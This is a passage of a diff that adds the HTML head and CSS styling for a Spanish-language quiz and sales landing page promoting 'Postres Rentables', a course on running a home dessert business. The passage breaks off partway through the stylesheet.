@@ -1,0 +1,2858 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="theme-color" content="#fff8f2" />
+  <meta name="description" content="Descubre tu potencial para comenzar un negocio de postres desde casa con Postres Rentables." />
+  <title>Postres Rentables | Quiz</title>
+
+  <style>
+    :root{
+      --bg:#fff8f2;
+      --surface:#ffffff;
+      --surface-2:#fff1e8;
+      --surface-3:#f9ece4;
+      --text:#2e1b17;
+      --muted:#75625d;
+      --brand:#ef5d72;
+      --brand-dark:#d8455c;
+      --brand-soft:#ffe3e8;
+      --accent:#f3a840;
+      --accent-soft:#fff0cf;
+      --success:#16845b;
+      --success-soft:#e6f6ef;
+      --border:#ead8cf;
+      --shadow:0 22px 60px rgba(71, 39, 30, .12);
+      --shadow-sm:0 10px 30px rgba(71, 39, 30, .09);
+      --radius:24px;
+      --radius-sm:16px;
+      --max:760px;
+    }
+
+    *{box-sizing:border-box}
+    html{
+      scroll-behavior:smooth;
+      -webkit-text-size-adjust:100%;
+      text-size-adjust:100%;
+    }
+
+    img, video, iframe, svg{max-width:100%}
+    body{
+      margin:0;
+      min-height:100%;
+      overflow-x:hidden;
+      background:
+        radial-gradient(circle at 15% -10%, rgba(239,93,114,.13), transparent 30%),
+        radial-gradient(circle at 90% 10%, rgba(243,168,64,.14), transparent 28%),
+        var(--bg);
+      color:var(--text);
+      font-family:Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      -webkit-font-smoothing:antialiased;
+    }
+
+    button, input, select, textarea{font:inherit}
+    button{cursor:pointer}
+
+    .app{
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+    }
+
+    .topbar{
+      position:sticky;
+      top:0;
+      z-index:20;
+      padding:14px 16px 10px;
+      background:rgba(255,248,242,.88);
+      backdrop-filter:blur(14px);
+      border-bottom:1px solid rgba(234,216,207,.72);
+    }
+
+    .topbar-inner{
+      width:min(var(--max), 100%);
+      margin:0 auto;
+    }
+
+    .brand-row{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+      margin-bottom:10px;
+    }
+
+    .logo{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      font-weight:900;
+      letter-spacing:-.025em;
+      color:var(--text);
+      user-select:none;
+    }
+
+    .logo-mark{
+      width:38px;
+      height:38px;
+      border-radius:12px;
+      display:grid;
+      place-items:center;
+      background:linear-gradient(135deg,var(--brand),#ff8b8e);
+      box-shadow:0 8px 22px rgba(239,93,114,.28);
+      font-size:20px;
+    }
+
+    .logo span small{
+      display:block;
+      color:var(--brand);
+      font-weight:800;
+      font-size:10px;
+      letter-spacing:.12em;
+      text-transform:uppercase;
+      line-height:1;
+      margin-bottom:2px;
+    }
+
+    .step-label{
+      font-size:12px;
+      font-weight:800;
+      color:var(--muted);
+      white-space:nowrap;
+    }
+
+    .header-back{
+      border:0;
+      background:transparent;
+      color:var(--muted);
+      font-size:13px;
+      font-weight:850;
+      padding:9px 4px 9px 10px;
+      min-height:40px;
+      white-space:nowrap;
+      transition:color .16s ease, transform .16s ease;
+    }
+
+    .header-back:hover{
+      color:var(--brand-dark);
+    }
+
+    .header-back:active{
+      transform:translateX(-2px);
+    }
+
+    .progress-track{
+      height:8px;
+      background:#f0ded5;
+      border-radius:999px;
+      overflow:hidden;
+    }
+
+    .progress-fill{
+      height:100%;
+      width:0%;
+      border-radius:999px;
+      background:linear-gradient(90deg,var(--brand),#ff8a72,var(--accent));
+      transition:width .45s cubic-bezier(.2,.8,.2,1);
+      box-shadow:0 0 20px rgba(239,93,114,.18);
+    }
+
+    main{
+      flex:1;
+      width:min(var(--max), 100%);
+      margin:0 auto;
+      padding:28px 16px 48px;
+    }
+
+    .screen{
+      display:none;
+      animation:screenIn .44s ease both;
+    }
+
+    .screen.active{display:block}
+
+    @keyframes screenIn{
+      from{opacity:0; transform:translateY(12px)}
+      to{opacity:1; transform:translateY(0)}
+    }
+
+    .hero{
+      padding-top:12px;
+      text-align:center;
+    }
+
+    .eyebrow{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding:8px 12px;
+      border-radius:999px;
+      background:var(--brand-soft);
+      color:var(--brand-dark);
+      font-weight:850;
+      font-size:12px;
+      letter-spacing:.015em;
+      margin-bottom:16px;
+    }
+
+    h1,h2,h3,p{margin-top:0}
+
+    h1,h2,h3{
+      max-width:100%;
+      overflow-wrap:break-word;
+      word-break:normal;
+      text-wrap:balance;
+    }
+
+    h1{
+      font-size:clamp(30px,6vw,50px);
+      line-height:1.04;
+      letter-spacing:-.04em;
+      margin-bottom:14px;
+    }
+
+    h2{
+      font-size:clamp(27px,5.2vw,40px);
+      line-height:1.1;
+      letter-spacing:-.03em;
+      margin-bottom:12px;
+    }
+
+    .hero-headline{
+      font-size:clamp(30px,6vw,50px);
+      line-height:1.04;
+      letter-spacing:-.04em;
+    }
+
+    .lead{
+      max-width:610px;
+      margin:0 auto 24px;
+      font-size:18px;
+      line-height:1.55;
+      color:var(--muted);
+    }
+
+    .highlight{
+      color:var(--brand-dark);
+      font-weight:900;
+    }
+
+    .hero-card{
+      margin:26px auto 18px;
+      background:linear-gradient(135deg,#fff 0%,#fff7f1 100%);
+      border:1px solid var(--border);
+      border-radius:28px;
+      padding:20px;
+      box-shadow:var(--shadow);
+      text-align:left;
+      overflow:hidden;
+      position:relative;
+    }
+
+    .hero-card:after{
+      content:"";
+      position:absolute;
+      width:180px;
+      height:180px;
+      right:-80px;
+      top:-80px;
+      border-radius:50%;
+      background:radial-gradient(circle,rgba(243,168,64,.2),transparent 68%);
+      pointer-events:none;
+    }
+
+    .mini-grid{
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:10px;
+    }
+
+    .mini-pill{
+      border-radius:16px;
+      background:var(--surface);
+      border:1px solid var(--border);
+      padding:14px 12px;
+      text-align:center;
+      box-shadow:0 7px 18px rgba(71,39,30,.05);
+    }
+
+    .mini-pill b{
+      display:block;
+      font-size:22px;
+      margin-bottom:4px;
+    }
+
+    .mini-pill span{
+      color:var(--muted);
+      font-size:12px;
+      font-weight:700;
+      line-height:1.25;
+    }
+
+
+    .hero-visual{
+      position:relative;
+      margin:20px auto 16px;
+      border-radius:28px;
+      overflow:hidden;
+      border:1px solid var(--border);
+      background:#f6e6dc;
+      box-shadow:var(--shadow);
+      aspect-ratio:16/11;
+      max-width:680px;
+    }
+
+    .hero-visual img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      display:block;
+    }
+
+    .hero-visual:after{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:linear-gradient(180deg,transparent 55%,rgba(31,18,14,.34));
+      pointer-events:none;
+    }
+
+    .benefit-cards{
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:10px;
+      margin:14px 0 18px;
+    }
+
+    .benefit-card{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:9px;
+      min-width:0;
+      padding:14px 12px;
+      text-align:center;
+      border:1px solid var(--border);
+      border-radius:17px;
+      background:rgba(255,255,255,.9);
+      box-shadow:0 8px 20px rgba(71,39,30,.055);
+    }
+
+    .benefit-icon{
+      flex:0 0 38px;
+      width:38px;
+      height:38px;
+      border-radius:12px;
+      display:grid;
+      place-items:center;
+      background:var(--surface-2);
+      font-size:18px;
+    }
+
+    .benefit-card strong{
+      display:block;
+      font-size:13px;
+      line-height:1.2;
+      margin-bottom:3px;
+    }
+
+
+    .social-proof{
+      margin:15px auto 0;
+      display:block;
+      padding:0;
+      max-width:570px;
+      text-align:center;
+    }
+
+
+    .social-proof{
+      color:var(--muted);
+      font-size:11.5px;
+      line-height:1.35;
+      white-space:normal;
+    }
+
+    .social-proof strong{
+      display:inline;
+      color:var(--brand-dark);
+      font-size:14px;
+      line-height:1.2;
+    }
+
+    .btn{
+      border:0;
+      min-height:54px;
+      border-radius:16px;
+      padding:14px 22px;
+      font-weight:900;
+      font-size:16px;
+      transition:transform .16s ease, box-shadow .16s ease, background .16s ease;
+    }
+
+    .btn:active{transform:scale(.985)}
+    .btn-primary{
+      width:100%;
+      background:linear-gradient(135deg,var(--brand),#ff7f79);
+      color:white;
+      box-shadow:0 14px 28px rgba(239,93,114,.27);
+    }
+    .btn-primary:hover{
+      transform:translateY(-1px);
+      box-shadow:0 18px 34px rgba(239,93,114,.31);
+    }
+    .btn-secondary{
+      background:var(--surface);
+      color:var(--text);
+      border:1px solid var(--border);
+    }
+    .btn-link{
+      background:transparent;
+      color:var(--muted);
+      padding:8px 12px;
+      min-height:auto;
+      font-size:13px;
+    }
+
+    .trust{
+      margin-top:12px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:7px;
+      color:var(--muted);
+      font-size:12px;
+      font-weight:700;
+    }
+
+    .question-head{
+      text-align:center;
+      margin:8px auto 24px;
+    }
+
+    .question-number{
+      display:inline-block;
+      font-size:12px;
+      font-weight:900;
+      color:var(--brand-dark);
+      margin-bottom:10px;
+      text-transform:uppercase;
+      letter-spacing:.09em;
+    }
+
+    .question-head p{
+      color:var(--muted);
+      line-height:1.5;
+      margin-bottom:0;
+    }
+
+    .options{
+      display:grid;
+      gap:12px;
+    }
+
+    .option{
+      width:100%;
+      min-height:70px;
+      display:flex;
+      align-items:center;
+      gap:14px;
+      text-align:left;
+      padding:15px 16px;
+      border-radius:18px;
+      border:1px solid var(--border);
+      background:rgba(255,255,255,.9);
+      color:var(--text);
+      box-shadow:0 7px 18px rgba(71,39,30,.055);
+      transition:.18s ease;
+      position:relative;
+      overflow:hidden;
+    }
+
+    .option:hover{
+      transform:translateY(-2px);
+      border-color:#efb9bb;
+      box-shadow:0 13px 28px rgba(71,39,30,.09);
+    }
+
+    .option.selected{
+      border-color:var(--brand);
+      background:linear-gradient(135deg,#fff,#fff0f2);
+      box-shadow:0 12px 30px rgba(239,93,114,.14);
+    }
+
+    .option-icon{
+      flex:0 0 44px;
+      height:44px;
+      border-radius:14px;
+      display:grid;
+      place-items:center;
+      background:var(--surface-2);
+      font-size:22px;
+    }
+
+    .option.selected .option-icon{
+      background:var(--brand-soft);
+    }
+
+    .option-copy{
+      min-width:0;
+      flex:1;
+    }
+
+    .option-copy b{
+      display:block;
+      font-size:15px;
+      line-height:1.3;
+      margin-bottom:3px;
+    }
+
+    .option-copy span{
+      display:block;
+      color:var(--muted);
+      font-size:12px;
+      line-height:1.35;
+    }
+
+    .option-check{
+      width:25px;
+      height:25px;
+      border-radius:50%;
+      border:2px solid #dcc5bc;
+      display:grid;
+      place-items:center;
+      font-size:14px;
+      font-weight:900;
+      color:white;
+      flex:0 0 25px;
+      transition:.18s ease;
+    }
+
+    .option.selected .option-check{
+      border-color:var(--brand);
+      background:var(--brand);
+    }
+
+    .nav-row{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      margin-top:24px;
+    }
+
+    .nav-row .btn-primary{
+      width:auto;
+      min-width:160px;
+    }
+
+    #calculatorContinue{
+      margin-left:auto;
+      margin-right:auto;
+    }
+
+    .back-btn{
+      background:transparent;
+      border:0;
+      color:var(--muted);
+      font-weight:800;
+      padding:12px 6px;
+    }
+
+    .calc-shell{
+      background:linear-gradient(145deg,#fff,#fff5ed);
+      border:1px solid var(--border);
+      border-radius:28px;
+      box-shadow:var(--shadow);
+      overflow:hidden;
+    }
+
+    .calc-top{
+      padding:20px;
+      background:
+        radial-gradient(circle at 80% 0%,rgba(243,168,64,.18),transparent 42%),
+        var(--surface);
+      border-bottom:1px solid var(--border);
+    }
+
+    .calc-choice-grid{
+      display:grid;
+      grid-template-columns:repeat(4,1fr);
+      gap:10px;
+      margin-top:16px;
+    }
+
+    .calc-choice{
+      border:1px solid var(--border);
+      border-radius:16px;
+      min-height:62px;
+      background:white;
+      color:var(--text);
+      font-weight:950;
+      font-size:18px;
+      transition:.18s ease;
+    }
+
+    .calc-choice:hover{transform:translateY(-2px)}
+    .calc-choice.selected{
+      background:linear-gradient(135deg,var(--brand),#ff7e78);
+      border-color:var(--brand);
+      color:#fff;
+      box-shadow:0 10px 24px rgba(239,93,114,.24);
+    }
+
+    .calc-body{padding:20px}
+
+    .calc-summary{
+      display:flex;
+      flex-wrap:wrap;
+      align-items:flex-end;
+      justify-content:space-between;
+      gap:14px;
+      padding-bottom:18px;
+      border-bottom:1px solid var(--border);
+    }
+
+    .calc-kicker{
+      color:var(--muted);
+      font-size:12px;
+      font-weight:800;
+      text-transform:uppercase;
+      letter-spacing:.07em;
+      margin-bottom:5px;
+    }
+
+    .calc-title{
+      font-size:22px;
+      font-weight:950;
+      letter-spacing:-.025em;
+    }
+
+    .price-chip{
+      background:var(--accent-soft);
+      color:#80530f;
+      border:1px solid #f3d398;
+      border-radius:999px;
+      padding:9px 12px;
+      font-size:12px;
+      font-weight:900;
+    }
+
+    .numbers{
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:12px;
+      padding:18px 0;
+    }
+
+    .metric{
+      min-width:0;
+      border:1px solid var(--border);
+      border-radius:18px;
+      background:white;
+      padding:15px;
+    }
+
+    .metric span{
+      display:block;
+      color:var(--muted);
+      font-size:11px;
+      font-weight:800;
+      line-height:1.25;
+      margin-bottom:6px;
+    }
+
+    .metric strong{
+      display:block;
+      font-size:clamp(20px,5vw,28px);
+      line-height:1;
+      letter-spacing:-.035em;
+      word-break:break-word;
+    }
+
+    .metric.emphasis{
+      background:var(--success-soft);
+      border-color:#bce6d4;
+    }
+
+    .metric.emphasis strong{color:var(--success)}
+
+    .formula{
+      background:var(--surface-2);
+      border:1px solid var(--border);
+      border-radius:18px;
+      padding:16px;
+    }
+
+    .formula b{
+      display:block;
+      margin-bottom:7px;
+    }
+
+    .formula p{
+      margin:0;
+      color:var(--muted);
+      line-height:1.55;
+      font-size:13px;
+    }
+
+    .proof-strip{
+      margin-top:16px;
+      padding:17px;
+      border-radius:18px;
+      background:linear-gradient(135deg,#351f1a,#5a3029);
+      color:white;
+      display:flex;
+      align-items:center;
+      gap:12px;
+      box-shadow:0 12px 30px rgba(53,31,26,.18);
+    }
+
+    .proof-badge{
+      flex:0 0 44px;
+      width:44px;
+      height:44px;
+      border-radius:14px;
+      background:rgba(255,255,255,.12);
+      display:grid;
+      place-items:center;
+      font-size:21px;
+    }
+
+    .proof-strip strong{
+      display:block;
+      font-size:15px;
+      line-height:1.28;
+      margin-bottom:2px;
+    }
+
+    .proof-strip span{
+      display:block;
+      color:rgba(255,255,255,.75);
+      font-size:12px;
+    }
+
+    .small-note{
+      margin:12px 2px 0;
+      font-size:11px;
+      color:var(--muted);
+      line-height:1.45;
+    }
+
+    .commit-card{
+      border:1px solid var(--border);
+      border-radius:28px;
+      padding:22px;
+      background:linear-gradient(145deg,#fff,#fff5f2);
+      box-shadow:var(--shadow);
+    }
+
+    .analysis{
+      text-align:center;
+      padding:34px 12px;
+    }
+
+    .spinner{
+      width:62px;
+      height:62px;
+      border-radius:50%;
+      margin:0 auto 18px;
+      border:6px solid #f0ded6;
+      border-top-color:var(--brand);
+      animation:spin .9s linear infinite;
+    }
+
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .analysis-lines{
+      display:grid;
+      gap:10px;
+      max-width:420px;
+      margin:20px auto 0;
+      text-align:left;
+    }
+
+    .analysis-line{
+      opacity:.34;
+      transform:translateY(4px);
+      transition:.35s ease;
+      padding:12px 14px;
+      border:1px solid var(--border);
+      background:white;
+      border-radius:14px;
+      color:var(--muted);
+      font-size:13px;
+      font-weight:750;
+    }
+    .analysis-line.done{
+      opacity:1;
+      transform:none;
+      color:var(--success);
+      border-color:#c7e6d9;
+      background:var(--success-soft);
+    }
+
+
+    .vsl-final-head{
+      text-align:center;
+      margin:4px auto 18px;
+      max-width:700px;
+    }
+
+    .vsl-ready{
+      display:inline-block;
+      margin-bottom:12px;
+      color:var(--brand-dark);
+      font-size:14px;
+      font-weight:950;
+      letter-spacing:.035em;
+    }
+
+    .vsl-final-head h2{
+      margin:0 auto;
+      max-width:690px;
+      font-size:clamp(25px,5vw,38px);
+      line-height:1.1;
+      letter-spacing:-.03em;
+      overflow-wrap:break-word;
+      word-break:normal;
+      text-wrap:balance;
+    }
+
+    .vsl-arrow{
+      margin-top:10px;
+      font-size:34px;
+      line-height:1;
+      animation:vslArrow 1.25s ease-in-out infinite;
+    }
+
+    @keyframes vslArrow{
+      0%,100%{transform:translateY(0)}
+      50%{transform:translateY(6px)}
+    }
+
+    .vsl-wrap{
+      max-width:720px;
+      margin:0 auto;
+    }
+
+    .result-banner{
+      border-radius:24px;
+      border:1px solid #cfe8dc;
+      background:linear-gradient(135deg,#eefaf5,#fff);
+      padding:18px;
+      margin-bottom:18px;
+      display:flex;
+      align-items:flex-start;
+      gap:12px;
+    }
+
+    .result-banner .icon{
+      flex:0 0 42px;
+      height:42px;
+      display:grid;
+      place-items:center;
+      border-radius:14px;
+      background:var(--success);
+      color:white;
+      font-weight:950;
+    }
+
+    .result-banner strong{
+      display:block;
+      margin-bottom:3px;
+      font-size:16px;
+    }
+
+    .result-banner p{
+      margin:0;
+      color:var(--muted);
+      font-size:13px;
+      line-height:1.45;
+    }
+
+    .video-frame{
+      width:100%;
+      max-width:430px;
+      margin-left:auto;
+      margin-right:auto;
+      border-radius:24px;
+      overflow:hidden;
+      background:#211817;
+      box-shadow:var(--shadow);
+      border:1px solid rgba(255,255,255,.08);
+    }
+
+    .video-placeholder{
+      aspect-ratio:9/16;
+      width:100%;
+      max-width:420px;
+      max-height:650px;
+      margin:0 auto;
+      display:grid;
+      place-items:center;
+      text-align:center;
+      color:white;
+      padding:28px;
+      background:
+        radial-gradient(circle at 50% 35%,rgba(239,93,114,.26),transparent 33%),
+        linear-gradient(180deg,#36211d,#1e1513);
+    }
+
+    .play{
+      width:76px;
+      height:76px;
+      border-radius:50%;
+      margin:0 auto 16px;
+      display:grid;
+      place-items:center;
+      background:linear-gradient(135deg,var(--brand),#ff8a78);
+      box-shadow:0 14px 34px rgba(239,93,114,.28);
+      font-size:28px;
+      padding-left:4px;
+    }
+
+    .video-placeholder b{
+      display:block;
+      font-size:20px;
+      margin-bottom:8px;
+    }
+
+    .video-placeholder p{
+      color:rgba(255,255,255,.68);
+      max-width:360px;
+      margin:0 auto;
+      line-height:1.5;
+      font-size:13px;
+    }
+
+    .offer-card{
+      margin-top:18px;
+      background:white;
+      border:1px solid var(--border);
+      border-radius:26px;
+      padding:20px;
+      box-shadow:var(--shadow-sm);
+    }
+
+    .offer-card h3{
+      font-size:23px;
+      letter-spacing:-.025em;
+      margin-bottom:8px;
+    }
+
+    .offer-list{
+      display:grid;
+      grid-template-columns:repeat(2,1fr);
+      gap:9px;
+      margin:16px 0;
+    }
+
+    .offer-item{
+      display:flex;
+      gap:8px;
+      align-items:flex-start;
+      padding:11px;
+      border-radius:14px;
+      background:var(--surface-2);
+      font-size:12px;
+      font-weight:800;
+      line-height:1.35;
+    }
+
+    .offer-item i{
+      font-style:normal;
+      color:var(--success);
+    }
+
+    .price-row{
+      display:flex;
+      flex-wrap:wrap;
+      align-items:center;
+      justify-content:space-between;
+      gap:14px;
+      padding:15px 0 4px;
+      border-top:1px solid var(--border);
+      margin-top:4px;
+    }
+
+    .price-old{
+      color:var(--muted);
+      font-size:13px;
+    }
+
+    .price-old s{font-weight:800}
+    .price-now{
+      font-size:34px;
+      line-height:1;
+      font-weight:950;
+      letter-spacing:-.045em;
+      color:var(--brand-dark);
+      margin-top:4px;
+    }
+    .price-now span{
+      font-size:13px;
+      letter-spacing:0;
+      color:var(--muted);
+      font-weight:800;
+    }
+
+    .cta{
+      margin-top:16px;
+      background:linear-gradient(135deg,#178760,#19a674);
+      box-shadow:0 14px 28px rgba(23,135,96,.23);
+    }
+    .cta:hover{box-shadow:0 18px 34px rgba(23,135,96,.30)}
+
+    .micro{
+      text-align:center;
+      color:var(--muted);
+      font-size:11px;
+      margin:9px 0 0;
+      line-height:1.45;
+    }
+
+    .fade-number{
+      animation:numberPop .24s ease;
+    }
+
+    @keyframes numberPop{
+      0%{opacity:.35;transform:translateY(4px) scale(.98)}
+      100%{opacity:1;transform:none}
+    }
+
+    .hidden{display:none !important}
+
+    @media (max-width:640px){
+      main{
+        width:100%;
+        padding:18px 14px 40px;
+      }
+
+      .hero{padding-top:4px}
+
+      .hero-headline{
+        font-size:clamp(27px,7.2vw,34px);
+        line-height:1.08;
+        letter-spacing:-.032em;
+        margin-bottom:14px;
+      }
+
+      .question-head{
+        margin:4px auto 18px;
+      }
+
+      .question-head h2{
+        font-size:clamp(25px,6.5vw,31px);
+        line-height:1.1;
+        letter-spacing:-.026em;
+      }
+
+      .vsl-final-head{
+        margin:2px auto 14px;
+      }
+
+      .vsl-ready{
+        font-size:12px;
+        line-height:1.3;
+        margin-bottom:9px;
+      }
+
+      .vsl-final-head h2{
+        font-size:clamp(24px,6.2vw,30px);
+        line-height:1.11;
+        letter-spacing:-.025em;
+      }
+
+      .benefit-cards{grid-template-columns:1fr}
+      .benefit-card{padding:12px}
+      .hero-visual{aspect-ratio:4/3;border-radius:22px}
+      .mini-grid{grid-template-columns:1fr}
+      .mini-pill{
+        display:flex;
+        align-items:center;
+        gap:10px;
+        text-align:left;
+      }
+      .mini-pill b{margin:0}
+      .numbers{grid-template-columns:1fr}
+      .metric{
+        display:flex;
+        align-items:center;
+        justify-content:space-between;
+        gap:12px;
+      }
+      .metric span{margin:0; max-width:42%}
+      .calc-choice-grid{gap:7px}
+      .calc-choice{min-height:56px}
+      .offer-list{grid-template-columns:1fr}
+      .nav-row .btn-primary{min-width:145px}
+      .brand-row{align-items:center}
+      .logo span{font-size:14px}
+      .logo-mark{width:34px;height:34px}
+    }
+
+    @media (max-width:430px){
+      .topbar{padding:10px 12px 9px}
+      .brand-row{gap:8px;margin-bottom:8px}
+      .logo{gap:8px;min-width:0}
+      .logo-mark{
+        width:32px;
+        height:32px;
+        border-radius:10px;
+        font-size:17px;
+      }
+      .logo span{
+        font-size:13px;
+        line-height:1.05;
+      }
+      .logo span small{
+        font-size:8px;
+        letter-spacing:.1em;
+      }
+      .header-back{
+        font-size:12px;
+        padding:8px 2px 8px 8px;
+      }
+      .hero-headline{
+        font-size:27px;
+        line-height:1.08;
+      }
+      .lead{
+        font-size:15px;
+        line-height:1.48;
+      }
+      .eyebrow{
+        font-size:10.5px;
+        padding:7px 10px;
+        margin-bottom:12px;
+      }
+      .question-head h2{
+        font-size:25px;
+        line-height:1.1;
+      }
+      .option{
+        min-height:64px;
+        padding:13px 14px;
+        gap:11px;
+      }
+      .option-icon{
+        flex-basis:40px;
+        height:40px;
+        border-radius:12px;
+        font-size:19px;
+      }
+      .option-copy b{font-size:14px}
+      .option-copy span{font-size:11.5px}
+      .vsl-final-head h2{
+        font-size:24px;
+        line-height:1.12;
+      }
+      .vsl-arrow{font-size:30px}
+    }
+
+    @media (max-width:360px){
+      main{
+        padding-left:12px;
+        padding-right:12px;
+      }
+      .hero-headline{
+        font-size:25px;
+        line-height:1.09;
+        letter-spacing:-.025em;
+      }
+      .question-head h2{
+        font-size:23px;
+        line-height:1.12;
+        letter-spacing:-.02em;
+      }
+      .vsl-final-head h2{
+        font-size:22px;
+        line-height:1.13;
+        letter-spacing:-.018em;
+      }
+      .vsl-ready{font-size:11px}
+      .benefit-card strong{font-size:12.5px}
+      .calc-choice{
+        min-height:52px;
+        font-size:16px;
+      }
+      .btn{
+        min-height:52px;
+        padding:13px 14px;
+        font-size:14px;
+      }
+      .social-proof{font-size:10.5px}
+      .social-proof strong{font-size:12.5px}
+    }
+
+    @media (max-width:330px){
+      .hero-headline{font-size:23px}
+      .question-head h2{font-size:21px}
+      .vsl-final-head h2{font-size:20px}
+      .logo span{font-size:12px}
+      .header-back{font-size:11px}
+    }
+
+
+    .sales-page{width:100%;max-width:100%;padding:0}
+    .sales-page.active{display:block}
+
+    .pv-section{
+      width:min(760px,100%);
+      margin:0 auto;
+      padding:42px 16px;
+      position:relative;
+    }
+    .pv-section + .pv-section{border-top:1px solid rgba(234,216,207,.7)}
+
+    .pv-hero{padding-top:26px;text-align:center}
+    .pv-kicker{
+      display:inline-flex;
+      justify-content:center;
+      align-items:center;
+      max-width:100%;
+      margin-bottom:12px;
+      padding:9px 13px;
+      border-radius:999px;
+      background:var(--brand-soft);
+      color:var(--brand-dark);
+      font-size:12px;
+      line-height:1.25;
+      font-weight:950;
+      letter-spacing:.03em;
+    }
+    .pv-hero h1{
+      max-width:680px;
+      margin:0 auto 18px;
+      font-size:clamp(29px,6vw,46px);
+      line-height:1.05;
+      letter-spacing:-.038em;
+    }
+
+    .pv-mockup{
+      min-height:250px;
+      margin:18px auto;
+      max-width:640px;
+      display:grid;
+      place-items:center;
+      overflow:hidden;
+      border:1px solid var(--border);
+      border-radius:26px;
+      background:
+        radial-gradient(circle at 20% 15%,rgba(239,93,114,.16),transparent 32%),
+        radial-gradient(circle at 85% 70%,rgba(243,168,64,.18),transparent 35%),
+        #fff;
+      box-shadow:var(--shadow);
+      position:relative;
+    }
+    .pv-mockup img{width:100%;max-height:430px;display:block;object-fit:contain}
+    .mockup-fallback-content{display:none;align-items:center;justify-content:center;gap:14px;padding:32px 22px;text-align:left}
+    .mockup-fallback .mockup-fallback-content{display:flex}
+    .mockup-phone{
+      width:72px;height:104px;display:grid;place-items:center;border:5px solid var(--text);
+      border-radius:18px;background:#fff;font-size:34px;flex:0 0 auto
+    }
+    .mockup-fallback-content strong{display:block;font-size:19px;margin-bottom:5px}
+    .mockup-fallback-content span{color:var(--muted);font-size:12px;line-height:1.4}
+
+    .pv-hero-badges{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin:15px 0}
+    .pv-hero-badges span{
+      padding:9px 11px;border:1px solid var(--border);border-radius:999px;background:#fff;
+      color:var(--text);font-size:11px;font-weight:850
+    }
+
+    .pv-cta{
+      width:100%;min-height:58px;border:0;border-radius:17px;padding:15px 18px;
+      background:linear-gradient(135deg,#178760,#16a56f);color:white;font-size:15px;
+      font-weight:950;line-height:1.25;box-shadow:0 15px 30px rgba(23,135,96,.24);
+      transition:transform .16s ease, box-shadow .16s ease
+    }
+    .pv-cta:hover{transform:translateY(-1px);box-shadow:0 18px 34px rgba(23,135,96,.3)}
+    .pv-cta:active{transform:scale(.988)}
+
+    .pv-social-line{margin:13px auto 0;color:var(--muted);font-size:11.5px;line-height:1.4}
+    .pv-social-line strong{color:var(--brand-dark)}
+
+    .pv-section-title{text-align:center;margin-bottom:22px}
+    .pv-section-title h2{
+      max-width:650px;margin:10px auto 0;font-size:clamp(27px,5.4vw,38px);
+      line-height:1.08;letter-spacing:-.03em
+    }
+    .pv-title-chip{
+      display:inline-flex;align-items:center;justify-content:center;padding:7px 11px;border-radius:999px;
+      background:var(--brand-soft);color:var(--brand-dark);font-size:10px;font-weight:950;
+      letter-spacing:.08em;line-height:1.2
+    }
+    .pv-title-chip-gold{background:var(--accent-soft);color:#8a580b}
+
+    .pv-learning-list{display:grid;gap:10px}
+    .pv-learning-card{
+      width:100%;min-height:62px;display:flex;align-items:center;gap:13px;padding:13px 15px;
+      border-radius:17px;border:1px solid var(--border);background:#fff;
+      box-shadow:0 7px 20px rgba(71,39,30,.055)
+    }
+    .pv-learning-card span{
+      flex:0 0 40px;width:40px;height:40px;display:grid;place-items:center;
+      border-radius:12px;background:var(--surface-2);font-size:19px
+    }
+    .pv-learning-card strong{font-size:14px;line-height:1.3}
+
+    .pv-desserts-section{overflow:hidden}
+
+    .pv-marquee{
+      width:100%;
+      overflow:hidden;
+      position:relative;
+      padding:2px 0 10px;
+    }
+
+    .pv-marquee:before,
+    .pv-marquee:after{
+      content:"";
+      position:absolute;
+      top:0;
+      bottom:0;
+      width:34px;
+      z-index:3;
+      pointer-events:none;
+    }
+
+    .pv-marquee:before{
+      left:0;
+      background:linear-gradient(90deg,var(--bg),rgba(255,248,242,0));
+    }
+
+    .pv-marquee:after{
+      right:0;
+      background:linear-gradient(270deg,var(--bg),rgba(255,248,242,0));
+    }
+
+    .pv-marquee-track{
+      display:flex;
+      width:max-content;
+      gap:12px;
+      animation:dessertMarquee 36s linear infinite;
+      will-change:transform;
+    }
+
+    .pv-marquee:hover .pv-marquee-track{
+      animation-play-state:paused;
+    }
+
+    @keyframes dessertMarquee{
+      from{transform:translateX(0)}
+      to{transform:translateX(calc(-50% - 6px))}
+    }
+
+    .pv-bonus-section{background:linear-gradient(180deg,rgba(255,241,232,.62),rgba(255,248,242,0))}
+    .pv-bonus-grid{display:grid;gap:12px}
+
+    .pv-bonus-card{
+      position:relative;
+      display:flex;
+      align-items:center;
+      gap:14px;
+      min-height:108px;
+      padding:16px;
+      border-radius:22px;
+      border:1px solid #ecd7ad;
+      background:
+        radial-gradient(circle at 100% 0%,rgba(243,168,64,.16),transparent 34%),
+        linear-gradient(135deg,#fffdf8,#fff);
+      box-shadow:0 12px 28px rgba(96,62,28,.08);
+      overflow:hidden;
+      text-align:left;
+    }
+
+    .bonus-gift{
+      flex:0 0 58px;
+      width:58px;
+      height:58px;
+      display:grid;
+      place-items:center;
+      border-radius:18px;
+      background:linear-gradient(135deg,#fff0cf,#ffe5ad);
+      border:1px solid #f0cf8a;
+      font-size:30px;
+      box-shadow:inset 0 1px 0 rgba(255,255,255,.8);
+    }
+
+    .bonus-content{min-width:0}
+
+    .bonus-number{
+      display:inline-block;
+      padding:5px 8px;
+      border-radius:999px;
+      background:#3a251f;
+      color:#fff;
+      font-size:8px;
+      font-weight:950;
+      letter-spacing:.09em;
+      margin-bottom:7px;
+    }
+
+    .pv-bonus-card h3{
+      margin:0;
+      font-size:16px;
+      line-height:1.24;
+      letter-spacing:-.015em;
